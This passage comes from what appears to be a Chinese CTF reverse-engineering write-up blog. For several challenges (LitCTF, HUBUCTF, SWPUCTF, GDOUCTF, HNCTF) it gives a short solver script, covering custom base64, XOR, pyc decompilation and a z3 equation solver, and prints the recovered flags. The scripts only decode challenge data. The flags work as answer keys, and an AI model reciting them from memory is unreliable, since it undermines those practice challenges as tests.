WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key2 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    crypto_text <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key2<span class="token punctuation">)</span>    <span class="token keyword">return</span> crypto_text<span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    message_str <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> message_str<span class="token keyword">def</span> <span class="token function">encrypt2</span><span class="token punctuation">(</span>tips<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt2</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    tips <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0='</span>key <span class="token operator">=</span> <span class="token string">'this is key'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please input key: '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token operator">==</span> decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> result <span class="token operator">==</span> key<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;0e26d898-b454-43de-9c87-eb3d122186bc&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key is error.'</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception<span class="token punctuation">:</span>    e <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">del</span> e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键是要逆向出真的key，然后输入真的key得到flag</p><h3 id="exp-14"><a class="markdownIt-Anchor" href="#exp-14"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">decrypt2</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    tips <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">'this is key'</span><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#this is true key</span><span class="token comment">#OUTPUT:</span><span class="token comment">#please input key: this is true key</span><span class="token comment">#flag&#123;5236cb7d-f4a7-4080-9bde-8b9e061609ad&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="litctf-2023enbase64"><a class="markdownIt-Anchor" href="#litctf-2023enbase64"></a> [LitCTF 2023]enbase64</h2><h3 id="题目描述-15"><a class="markdownIt-Anchor" href="#题目描述-15"></a> 题目描述</h3><p>换表base64</p><h3 id="exp-15"><a class="markdownIt-Anchor" href="#exp-15"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64enc<span class="token operator">=</span><span class="token string">"GQTZlSqQXZ/ghxxwhju3hbuZ4wufWjujWrhYe7Rce7ju"</span>code<span class="token operator">=</span><span class="token string">"gJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND"</span>coder<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=="</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>enc<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>coder<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">b'LitCTF&#123;B@5E64_l5_tooo0_E3sy!!!!!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hubuctf-2022-新生赛ezpython"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛ezpython"></a> [HUBUCTF 2022 新生赛]ezPython</h2><h3 id="题目描述-16"><a class="markdownIt-Anchor" href="#题目描述-16"></a> 题目描述</h3><p>给了一个pyc文件，直接在线反编译得到源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span><span class="token comment"># Version : Python 3.7</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64<span class="token keyword">import</span> base58password <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'password.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ans <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base58<span class="token punctuation">.</span>b58encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I've forgot my password,could you please help me find the password?"</span><span class="token punctuation">)</span><span class="token keyword">if</span> ans <span class="token operator">==</span> <span class="token string">'M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw=='</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'You get the password!'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong! try again'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-16"><a class="markdownIt-Anchor" href="#exp-16"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base58<span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlibans<span class="token operator">=</span><span class="token string">'M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw=='</span>password<span class="token operator">=</span>base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'HUBUCTF@1405'</span>flag<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string">b'HUBUCTF@1405'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#fd78ee3399dd6a3c1d0b637fdca0c075</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛easyapp"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛easyapp"></a> [SWPUCTF 2021 新生赛]easyapp</h2><h3 id="题目描述-17"><a class="markdownIt-Anchor" href="#题目描述-17"></a> 题目描述</h3><p>这个题目是安卓逆向。<br />根本没有做过这种题目，通过观看别人的wp知道了这题是要用到jadx反编译工具。<br />下面附带下载链接：<br /><a href="https://blog.csdn.net/weixin_39142112/article/details/80356244">https://blog.csdn.net/weixin_39142112/article/details/80356244</a><br />把文件丢进jadx里分析<br />我们需要找到这三个关键函数<br /><img src="https://www.nssctf.cn/files/2024/2/12/fd83a076e0.jpg" alt="NSSIMAGE" / loading="lazy"><br /><img src="https://www.nssctf.cn/files/2024/2/12/5aa9c60422.jpg" alt="NSSIMAGE" / loading="lazy"><br /><img src="https://www.nssctf.cn/files/2024/2/12/ea05bbd364.jpg" alt="NSSIMAGE" / loading="lazy"><br />首先查看关键信息，我们在第一个函数中能找到的关键信息就是这一串类似于乱码的字符串<br /><img src="https://www.nssctf.cn/files/2024/2/12/7b8537f43f.jpg" alt="NSSIMAGE" / loading="lazy"><br />我们在第二个函数中得到的信息是key的值是123456789然后在下面的for循环中看到了异或加密算法，看到这里我大概就懂了，应该就是把那串字符串去异或这个key。<br /><img src="https://www.nssctf.cn/files/2024/2/12/02951f3aca.jpg" alt="NSSIMAGE" / loading="lazy"><br />我们再来看看最后一个函数干了什么，这个函数好像把key的值修改了，它把123456789改成了987654321.<br /><img src="https://www.nssctf.cn/files/2024/2/12/96f8c3f636.jpg" alt="NSSIMAGE" / loading="lazy"></p><h3 id="exp-17"><a class="markdownIt-Anchor" href="#exp-17"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">"棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌"</span>key<span class="token operator">=</span><span class="token number">987654321</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> char <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment">#因为ASCII字符集只有128个字符，所以如果不取模，那么异或运算的结果可能超出ASCII范围，导致无法正确解密。取模128可以保证结果在0到127之间，也就是ASCII字符集的有效范围。</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;apkYYDS&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gdouctf-2023check_your_luckz3"><a class="markdownIt-Anchor" href="#gdouctf-2023check_your_luckz3"></a> [GDOUCTF 2023]Check_Your_Luck(z3)</h2><h3 id="题目描述-18"><a class="markdownIt-Anchor" href="#题目描述-18"></a> 题目描述</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">#include &lt;iostream&gt;using namespace std;void flag_checker(int v, int w,int x,int y,int z); int main()&#123;int v,w,x,y,z;cout &lt;&lt; &quot;Input 5 random number and check your luck ;)&quot; &lt;&lt; endl;cout &lt;&lt; &quot;Num1: &quot;;cin &gt;&gt; v;cout &lt;&lt; &quot;Num2: &quot;;cin &gt;&gt; w;cout &lt;&lt; &quot;Num3: &quot;;cin &gt;&gt; x;cout &lt;&lt; &quot;Num4: &quot;;cin &gt;&gt; y;cout &lt;&lt; &quot;Num5: &quot;;cin &gt;&gt; z;cout &lt;&lt; endl;flag_checker(v,w,x,y,z);&#125;void flag_checker(int v,int w, int x, int y, int z)&#123;if ((v * 23 + w * -32 + x * 98 + y * 55 + z * 90 &#x3D;&#x3D; 333322) &amp;&amp;(v * 123 + w * -322 + x * 68 + y * 67 + z * 32 &#x3D;&#x3D; 707724) &amp;&amp;(v * 266 + w * -34 + x * 43 + y * 8 + z * 32 &#x3D;&#x3D; 1272529) &amp;&amp;(v * 343 + w * -352 + x * 58 + y * 65 + z * 5 &#x3D;&#x3D; 1672457) &amp;&amp;(v * 231 + w * -321 + x * 938 + y * 555 + z * 970 &#x3D;&#x3D; 3372367))&#123;cout &lt;&lt; &quot;Congratulations, Here is your flag:\n&quot;;cout &lt;&lt; &quot;flag&#123;&quot; &lt;&lt; v &lt;&lt; &quot;_&quot; &lt;&lt; w &lt;&lt; &quot;_&quot; &lt;&lt; x &lt;&lt; &quot;_&quot; &lt;&lt; y &lt;&lt; &quot;_&quot; &lt;&lt; z &lt;&lt; &quot;&#125;&quot; &lt;&lt; endl;&#125;else&#123;cout &lt;&lt; &quot;\nSeems your luck is not in favor right now!\nBetter luck next time!&quot; &lt;&lt; endl;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然是这是五元一次方程，高斯消元可以求解，这里为了方便直接z3一把梭</p><h3 id="exp-18"><a class="markdownIt-Anchor" href="#exp-18"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>v<span class="token punctuation">,</span>w<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token operator">=</span>Ints<span class="token punctuation">(</span><span class="token string">'v w x y z'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">23</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">32</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">98</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">55</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">90</span> <span class="token operator">==</span> <span class="token number">333322</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">123</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">322</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">68</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">67</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">==</span> <span class="token number">707724</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">266</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">34</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">43</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">==</span> <span class="token number">1272529</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">343</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">352</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">65</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">1672457</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">231</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">321</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">938</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">555</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">970</span> <span class="token operator">==</span> <span class="token number">3372367</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#[x = 677, w = 123, z = 777, v = 4544, y = 1754]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1贝斯是什么乐器啊"><a class="markdownIt-Anchor" href="#hnctf-2022-week1贝斯是什么乐器啊"></a> [HNCTF 2022 Week1]贝斯是什么乐器啊？</h2><h3 id="题目描述-19"><a class="markdownIt-Anchor" href="#题目描述-19"></a> 题目描述</h3><p>base64后，加改减就可以</p><h3 id="exp-19"><a class="markdownIt-Anchor" href="#exp-19"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64enc<span class="token operator">=</span><span class="token string">"TlJRQFBBdTs4alsrKFI6MjgwNi5p"</span>enc_<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc_<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>enc_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#b'NRQ@PAu;8j[+(R:2806.i'</span><span class="token comment">#NSSCTF&#123;B@se64_HAHAHA&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1x0r"><a class="markdownIt-Anchor" href="#hnctf-2022-week1x0r"></a> [HNCTF 2022 Week1]X0r</h2><h3 id="题目描述-20"><a class="markdownIt-Anchor" href="#题目描述-20"></a> 题目描述</h3><p>简单的异或</p><h3 id="exp-20"><a class="markdownIt-Anchor" href="#exp-20"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1022</span><span class="token punctuation">,</span>  <span class="token number">1003</span><span class="token punctuation">,</span>  <span class="token number">1003</span><span class="token punctuation">,</span>  <span class="token number">1019</span><span class="token punctuation">,</span>  <span class="token number">996</span><span class="token punctuation">,</span>  <span class="token number">1014</span><span class="token punctuation">,</span>  <span class="token number">979</span><span class="token punctuation">,</span>  <span class="token number">976</span><span class="token punctuation">,</span>  <span class="token number">904</span><span class="token punctuation">,</span>  <span class="token number">970</span><span class="token punctuation">,</span>  <span class="token number">1007</span><span class="token punctuation">,</span>  <span class="token number">905</span><span class="token punctuation">,</span>  <span class="token number">971</span><span class="token punctuation">,</span>  <span class="token number">1007</span><span class="token punctuation">,</span>  <span class="token number">971</span><span class="token punctuation">,</span>  <span class="token number">904</span><span class="token punctuation">,</span>  <span class="token number">1007</span><span class="token punctuation">,</span>  <span class="token number">981</span><span class="token punctuation">,</span>  <span class="token number">985</span><span class="token 